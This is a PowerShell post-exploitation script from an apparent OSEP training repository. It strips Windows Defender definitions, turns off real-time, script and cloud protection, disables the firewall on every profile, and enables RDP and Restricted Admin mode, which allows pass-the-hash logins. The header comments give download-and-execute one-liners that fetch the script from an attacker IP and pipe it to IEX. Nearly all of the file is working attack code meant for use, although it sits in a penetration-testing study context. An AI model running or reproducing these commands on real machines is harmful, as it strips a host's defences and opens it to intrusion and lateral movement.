# beauknowstech OSEP repo - https://github.com/beauknowstech/OSEP-Everything/blob/main/EveryBox/dropav.ps1
# (New-Object System.Net.WebClient).DownloadString("http://192.168.XXX.XXX/dropAV.ps1") | IEX
# irm http://192.168.x.x/dropav.ps1 | IEX
# Slightly modified from https://github.com/emanuelepicas/OSEP/blob/master/AV-Evasion/DisableSecuritySettings/dropAV_AND_More.ps1

# Roll back definitions
cmd.exe /c "C:\Program Files\Windows Defender\MpCmdRun.exe" -removedefinitions -all


# Disable Windows Defender Real-Time Monitoring
Set-MpPreference -DisableRealtimeMonitoring $true

# Disable various Windows Defender protection features
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisablePrivacyMode $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisableScriptScanning $true

# Disable Cloud-delivered Protection
Set-MpPreference -MAPSReporting Disabled

# Disable Automatic Sample Submission
Set-MpPreference -SubmitSamplesConsent NeverSend

#Disable Real-time Protection
Set-MpPreference -DisableAutoExclusions $true

#Configure Quarantine Behavior
Set-MpPreference -PUAProtection 0


New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name DisableRestrictedAdmin  -Value 0
#may have to run manually in cmd:
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f

reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f


# Disable Windows Firewall for all profiles
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Optionally disable Windows Defender completely (very cautious use recommended)
# Disable-WindowsOptionalFeature -Online -FeatureName Windows-Defender-Features

# Function to check the status of Windows Defender settings
function Check-DefenderStatus {
    Get-MpPreference
}

# Call the function to output the current status of Defender settings
Check-DefenderStatus

# Reminder message
Write-Host "All security settings have been disabled. Ensure to re-enable after testing." -ForegroundColor Red
